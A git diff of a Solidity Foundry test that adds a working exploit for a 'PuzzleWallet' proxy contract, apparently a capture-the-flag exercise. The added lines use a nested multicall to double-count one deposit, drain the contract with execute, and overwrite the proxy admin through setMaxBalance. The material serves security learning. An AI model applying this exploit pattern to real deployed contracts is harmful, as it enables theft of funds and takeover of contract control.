@@ -27,13 +27,27 @@ contract PuzzleWalletTest is Test {
         target.deposit{value: 1 ether}();
 
         vm.label(address(player), "Player");
+        vm.deal(player, 1 ether);
     }
 
     function testPuzzleWallet() public {
         vm.startPrank(address(player));
 
+        bytes[] memory depositSelector = new bytes[](1);
+        depositSelector[0] = abi.encodeWithSelector(target.deposit.selector);
+        bytes[] memory nestedMulticall = new bytes[](2);
+        nestedMulticall[0] = abi.encodeWithSelector(target.deposit.selector);
+        nestedMulticall[1] = abi.encodeWithSelector(
+            target.multicall.selector,
+            depositSelector
+        );
+
         proxy.proposeNewAdmin(player);
         target.addToWhitelist(player);
+
+        target.multicall{value: 1 ether}(nestedMulticall);
+        target.execute(msg.sender, 2 ether, "");
+        target.setMaxBalance(uint256(uint160(player)));
 
         assertTrue(proxy.admin() == player);
 
